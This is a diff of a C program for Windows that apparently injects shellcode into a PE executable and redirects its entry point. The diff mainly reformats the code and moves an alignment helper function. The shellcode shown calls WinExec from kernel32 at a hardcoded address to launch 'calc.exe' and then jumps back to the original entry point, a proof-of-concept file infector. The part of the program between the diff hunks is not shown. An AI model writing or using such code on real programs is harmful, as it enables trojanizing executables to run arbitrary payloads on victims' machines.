@@ -1,48 +1,56 @@
 #include<stdio.h>
 #include<windows.h>
 
-DWORD alignment(DWORD base, DWORD address);
+
+/*
+ * Alignment between base and address
+ */
+DWORD alignment(DWORD base, DWORD address) {
+	return (address % base == 0) ? address : (((address / base) + 1) * base);
+}
+
+
 int main(int argc, char *argv[]) {
 	if (argc != 2)
 		exit(EXIT_FAILURE);
 
-	HANDLE hFile = CreateFile(argv[1], GENERIC_WRITE | GENERIC_READ,
-	FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING,
-	FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hFile = CreateFile(
+		argv[1],
+		GENERIC_WRITE | GENERIC_READ,
+		FILE_SHARE_WRITE | FILE_SHARE_READ,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
 
 	if (hFile == INVALID_HANDLE_VALUE)
 		exit(EXIT_FAILURE);
-
-	/*
-	 * Pattern
-	 */
-	char pattern = 0x00;
 
 	/*
 	 * Shellcode JMP EntrypointRedirection
 	 * BB DWORD : Jump absolute
 	 */
 	char shellcode[] =
-"\xEB\x13"
-"\x5B"
-"\x31\xC0"
-"\x50"
-"\x53"
-"\xBB\xF1\x2F\x4D\x76"// kernel32.dll WinExec
-"\xFF\xD3"
-"\xBB"
+	"\xEB\x13"
+	"\x5B"
+	"\x31\xC0"
+	"\x50"
+	"\x53"
+	// kernel32.dll WinExec
+	"\xBB\xF1\x2F\x4D\x76"
+	"\xFF\xD3"
+	"\xBB"
+	//EOP
+	"\xFF\xFF\xFF\xFF"
+	"\xFF\xE3"
+	"\xE8\xE8\xFF\xFF\xFF"
+	"\x63\x61\x6C"
+	"\x63\x2E"
+	"\x65\x78\x65";
 
-//15 bytes to modifiy EOP
-"\xFF\xFF\xFF\xFF"
-
-"\xFF\xE3"
-"\xE8\xE8\xFF\xFF\xFF"
-"\x63\x61\x6C"
-"\x63\x2E"
-"\x65\x78\x65";
-
+	char pattern = 0x00;
 	DWORD pEOP = 15;
-	DWORD sizeofshellcode = strlen(shellcode) * sizeof(char);
+	DWORD sizeofshellcode = strlen(shellcode);
 
 	/*
 	 * DUMP PE section headers
@@ -138,11 +146,4 @@ int main(int argc, char *argv[]) {
 
 	CloseHandle(hFile);
 	return 0;
-}
-
-/*
- * Calculate Alignment between base and address
- */
-DWORD alignment(DWORD base, DWORD address) {
-	return (address % base == 0) ? address : (((address / base) + 1) * base);
 }
